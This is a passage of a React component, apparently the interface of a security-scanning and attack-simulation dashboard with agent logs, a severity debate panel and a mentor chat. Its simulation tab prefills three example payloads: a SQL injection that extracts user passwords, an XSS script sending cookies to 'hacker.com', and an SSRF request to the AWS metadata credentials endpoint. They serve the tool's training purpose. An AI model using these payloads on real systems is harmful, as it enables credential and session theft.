                            ? 'bg-blue-500/10 border-blue-500/40 text-white shadow-sm' 
                            : 'bg-[#101524]/60 border-[#1e293b] hover:border-slate-700 text-slate-300'
                        }`}
                      >
                        <div className="font-bold text-sm tracking-tight">{repo.owner}/{repo.name}</div>
                        <div className="text-xs text-slate-500 font-mono">Commit: {s.commit_sha}</div>
                        <div className="flex justify-between items-center text-xs mt-1">
                          <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 text-[10px] font-bold uppercase rounded border ${
                            s.status === 'Success' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' :
                            s.status === 'Running' ? 'bg-blue-500/10 text-blue-400 border-blue-500/20 animate-pulse' :
                            'bg-red-500/10 text-red-400 border-red-500/20'
                          }`}>
                            {s.status}
                          </span>
                          <span className="text-[10px] text-slate-500">{new Date(s.created_at).toLocaleTimeString()}</span>
                        </div>
                      </button>
                    );
                  })}
                  {scans.length === 0 && (
                    <p className="text-center text-slate-500 py-10 font-mono">
                      No security runs active. Trigger a scan first!
                    </p>
                  )}
                </div>
              </div>

              {/* Execution Console Terminal */}
              <div className="glass-card rounded-2xl p-6 lg:col-span-2 space-y-6 flex flex-col">
                
                {/* Panel Header */}
                <div className="flex items-center justify-between border-b border-[#1e293b] pb-4">
                  <h3 className="text-md font-bold text-white flex items-center gap-2">
                    <Activity className="w-4 h-4 text-emerald-400" />
                    Agent Flow Output Terminal
                  </h3>
                  {selectedScan && (
                    <span className="text-xs font-mono text-slate-400">Scan ID: {selectedScan.id}</span>
                  )}
                </div>

                {/* Console Outputs */}
                {selectedScan ? (
                  <div className="space-y-6 flex-1 flex flex-col">
                    
                    {/* Live Terminal Log Shell */}
                    <div className="terminal-window rounded-xl p-4 text-xs space-y-2 max-h-[350px] overflow-y-auto flex-1 font-mono text-emerald-400">
                      {agentLogs.map((log) => (
                        <div key={log.id} className="flex gap-2">
                          <span className="text-slate-500 shrink-0">[{new Date(log.created_at).toLocaleTimeString()}]</span>
                          <span className="text-purple-400 shrink-0">{log.agent_name}:</span>
                          <span className={`${
                            log.status === 'Error' ? 'text-red-400 font-bold' :
                            log.status === 'Success' ? 'text-emerald-300 font-bold' :
                            'text-emerald-400'
                          }`}>{log.message}</span>
                        </div>
                      ))}
                      {agentLogs.length === 0 && (
                        <div className="text-slate-600 italic">No agent log sequences streamed yet...</div>
                      )}
                    </div>

                    {/* Agent Severity Rating Debate Panel */}
                    <div className="space-y-3">
                      <h4 className="text-sm font-bold text-white flex items-center gap-1.5 border-t border-[#1e293b] pt-4">
                        <Bot className="w-4 h-4 text-purple-400" />
                        AI Agent Debate System
                      </h4>
                      
                      <div className="space-y-3">
                        {agentLogs.filter(l => l.status === 'Debate').map((log) => {
                          const steps = log.debate_context ? JSON.parse(log.debate_context) : [];
                          return (
                            <div key={log.id} className="space-y-3 bg-[#0d1322] border border-[#1e293b] p-4 rounded-xl">
                              <div className="text-xs font-semibold text-slate-400 border-b border-[#1e293b]/40 pb-2 mb-2">
                                Threat Severity Debate Logs
                              </div>
                              <div className="space-y-3.5">
                                {steps.map((s, idx) => (
                                  <div key={idx} className="flex gap-3 text-xs leading-relaxed">
                                    <div className="shrink-0 mt-0.5">
                                      <span className={`px-2 py-0.5 font-bold uppercase rounded text-[9px] border ${
                                        s.agent.includes('Scanner') ? 'bg-blue-500/10 text-blue-400 border-blue-500/20' :
                                        s.agent.includes('Intel') ? 'bg-purple-500/10 text-purple-400 border-purple-500/20' :
                                        'bg-orange-500/10 text-orange-400 border-orange-500/20'
                                      }`}>
                                        {s.agent}
                                      </span>
                                    </div>
                                    <p className="text-slate-300">"{s.message}"</p>
                                  </div>
                                ))}
                              </div>
                            </div>
                          );
                        })}
                        {agentLogs.filter(l => l.status === 'Debate').length === 0 && (
                          <div className="text-xs text-slate-500 italic p-3 bg-[#0d1322] border border-[#1e293b]/40 rounded-xl font-mono">
                            Severity assessment completed without upgrade debates.
                          </div>
                        )}
                      </div>
                    </div>

                  </div>
                ) : (
                  <div className="h-96 flex flex-col items-center justify-center text-slate-500 gap-2 font-mono">
                    <Terminal className="w-8 h-8 text-purple-500/30 animate-pulse" />
                    <span>Select an execution run to watch the live SecOps processes.</span>
                  </div>
                )}
              </div>

            </div>
          )}

          {/* ==================== ATTACK SIMULATION TAB ==================== */}
          {activeTab === 'simulation' && (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
              
              {/* Simulation Configuration Form */}
              <div className="glass-card rounded-2xl p-6 h-fit space-y-6">
                <h3 className="text-md font-bold text-white border-b border-[#1e293b] pb-4 flex items-center gap-2">
                  <Skull className="w-4 h-4 text-orange-400" />
                  Configure Simulated Attack
                </h3>

                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-mono uppercase text-slate-400">Vulnerability Target Type</label>
                    <select
                      value={simType}
                      onChange={(e) => {
                        setSimType(e.target.value);
                        if (e.target.value === 'SQL Injection') {
                          setSimPayload("' UNION SELECT id, username, password FROM users --");
                        } else if (e.target.value === 'Cross-Site Scripting (XSS)') {
                          setSimPayload("<script>fetch('http://hacker.com/steal?c='+document.cookie)</script>");
                        } else {
                          setSimPayload("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
                        }
                      }}
                      className="w-full bg-[#0a0e17] border border-[#1e293b] rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 font-sans"
                    >
                      <option>SQL Injection</option>
                      <option>Cross-Site Scripting (XSS)</option>
                      <option>Server-Side Request Forgery (SSRF)</option>
                    </select>
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-mono uppercase text-slate-400">Exploit Injection Payload</label>
                    <textarea
                      rows="4"
                      value={simPayload}
                      onChange={(e) => setSimPayload(e.target.value)}
                      className="w-full bg-[#0a0e17] border border-[#1e293b] rounded-xl p-4 text-xs focus:outline-none focus:border-blue-500 font-mono leading-normal"
                    ></textarea>
                  </div>

                  <button
                    onClick={runSimulation}
                    className="w-full btn-cyber-primary text-white text-sm font-bold py-3 px-4 rounded-xl flex items-center justify-center gap-2"
                    disabled={isSimulating}
                  >
                    <Play className="w-4 h-4" />
                    {isSimulating ? 'Executing Attack Simulation...' : 'Launch Simulation'}
                  </button>
                </div>
              </div>

              {/* Simulation Hacking Terminal Outputs */}
              <div className="glass-card rounded-2xl p-6 lg:col-span-2 space-y-6 flex flex-col min-h-[500px]">
                <h3 className="text-md font-bold text-white border-b border-[#1e293b] pb-4 flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-orange-400" />
                  Hacking Console Outputs
                </h3>

                <div className="terminal-window rounded-xl p-5 text-xs font-mono space-y-2.5 flex-1 max-h-[350px] overflow-y-auto">
                  {simLogs.map((log, idx) => (
                    <div key={idx} className={`${
                      log.includes('[SUCCESS]') || log.includes('[+]') ? 'text-emerald-300' :
                      log.includes('[FAILED]') || log.includes('[-]') || log.includes('[!]') ? 'text-red-400' :
                      'text-slate-400'
                    }`}>
                      {log}
                    </div>
                  ))}
                  {simLogs.length === 0 && (
                    <div className="text-slate-600 italic">Hacking sandbox ready. Setup attack vector and click Launch.</div>
                  )}
                </div>

                {/* Extracted Data Visualizer */}
                {simResult && (
                  <div className="space-y-2 bg-[#090d16] border border-[#1e293b] rounded-xl p-4">
                    <div className="flex items-center justify-between text-xs border-b border-[#1e293b]/40 pb-2 mb-2">
                      <span className="font-semibold text-slate-400">Captured Output Metadata</span>
                      <span className={`font-bold ${simResult.success ? 'text-red-400' : 'text-slate-500'}`}>
                        {simResult.success ? 'SYSTEM COMPROMISED' : 'SECURE'}
                      </span>
                    </div>
                    {simResult.captured_data ? (
                      <pre className="text-xs font-mono text-emerald-400 overflow-x-auto leading-relaxed max-h-48 whitespace-pre-wrap">
                        {simResult.captured_data}
                      </pre>
                    ) : (
                      <span className="text-xs text-slate-500 italic">No credentials or sensitive metadata leaked during bypass attempt.</span>
                    )}
                  </div>
                )}
              </div>

            </div>
          )}

          {/* ==================== AI SECURITY MENTOR TAB ==================== */}
          {activeTab === 'mentor' && (
            <div className="grid grid-cols-1 lg:grid-cols-4 gap-8">
              
              {/* Left Column: Preset Questions */}
              <div className="glass-card rounded-2xl p-6 lg:col-span-1 space-y-4 h-fit">
                <h3 className="text-sm font-bold text-white border-b border-[#1e293b] pb-3 flex items-center gap-1.5">
                  <HelpCircle className="w-4 h-4 text-cyan-400" />
                  Suggested Cyber Topics
                </h3>
                
                <div className="flex flex-col gap-2">
                  {[
                    "Why is SQL Injection dangerous and how does parameterized query fix it?",
                    "Explain Cross-Site Scripting (XSS) and safe DOM render options.",
                    "How does SSRF exploitation work in AWS settings?",
                    "Why are hardcoded secrets critical risks?"
                  ].map((q, idx) => (
                    <button
                      key={idx}
                      onClick={() => setMentorInput(q)}
                      className="text-left text-xs p-2.5 rounded-lg border border-[#1e293b] hover:border-slate-600 bg-[#161b2a]/30 text-slate-400 hover:text-slate-200 transition"
                    >
                      {q}
                    </button>
                  ))}
                </div>
              </div>

              {/* Right Column: Q&A Chat window */}
              <div className="glass-card rounded-2xl p-6 lg:col-span-3 flex flex-col h-[650px]">
                <div className="flex items-center justify-between border-b border-[#1e293b] pb-4 mb-4">
                  <h3 className="text-md font-bold text-white flex items-center gap-2">
                    <Bot className="w-5 h-5 text-cyan-400" />
                    AI Mentor Assistance Chat
                  </h3>
                  <button 
                    onClick={async () => {
                      await fetch('/api/mentor/clear', { method: 'POST' });
                      fetchChatHistory();
                    }}
                    className="text-xs text-slate-500 hover:text-slate-400"
                  >
                    Clear history
                  </button>
                </div>

                {/* Message Threads */}
                <div className="flex-1 overflow-y-auto space-y-4 px-2 mb-4">
                  {mentorHistory.map((chat) => (
                    <div 
                      key={chat.id} 
                      className={`flex gap-3 max-w-[80%] ${chat.sender === 'user' ? 'ml-auto flex-row-reverse' : ''}`}
                    >
                      <div className={`p-2 rounded-lg text-xs shrink-0 ${
                        chat.sender === 'user' ? 'bg-blue-500/10 border border-blue-500/20 text-blue-400' : 'bg-purple-500/10 border border-purple-500/20 text-purple-400'
                      }`}>
                        {chat.sender === 'user' ? <User className="w-4 h-4" /> : <Bot className="w-4 h-4" />}
                      </div>
                      
                      <div className={`p-4 rounded-2xl text-xs leading-relaxed border ${
                        chat.sender === 'user' 
                          ? 'bg-[#1e293b]/40 border-[#2a364f] text-slate-200 rounded-tr-none' 
                          : 'bg-[#0f172a] border-[#1e293b] text-slate-300 rounded-tl-none whitespace-pre-wrap'
                      }`}>
                        {chat.message}
                      </div>
                    </div>
                  ))}
                  {mentorHistory.length === 0 && (
                    <div className="h-full flex flex-col items-center justify-center text-slate-500 gap-2 font-mono">
                      <MessageSquare className="w-8 h-8 text-cyan-500/30 animate-pulse" />
                      <span>Introduce yourself or click a cyber topic to start learning secure code practices.</span>
                    </div>
                  )}
                </div>

                {/* Input Bar */}
                <div className="flex gap-3 border-t border-[#1e293b] pt-4">
                  <input
                    type="text"
                    value={mentorInput}
                    onChange={(e) => setMentorInput(e.target.value)}
                    onKeyDown={(e) => { if (e.key === 'Enter') sendMentorMessage(); }}
                    placeholder="Ask security mentor why vulnerabilities occur and code fixes..."
                    className="flex-1 bg-[#0a0e17] border border-[#1e293b] rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500"
                  />
                  <button
                    onClick={sendMentorMessage}
                    className="btn-cyber-primary text-white text-sm font-bold px-6 rounded-xl shrink-0"
                  >
                    Send Query
                  </button>
                </div>
              </div>

            </div>
          )}

        </div>
      </main>
    </div>
  );
}
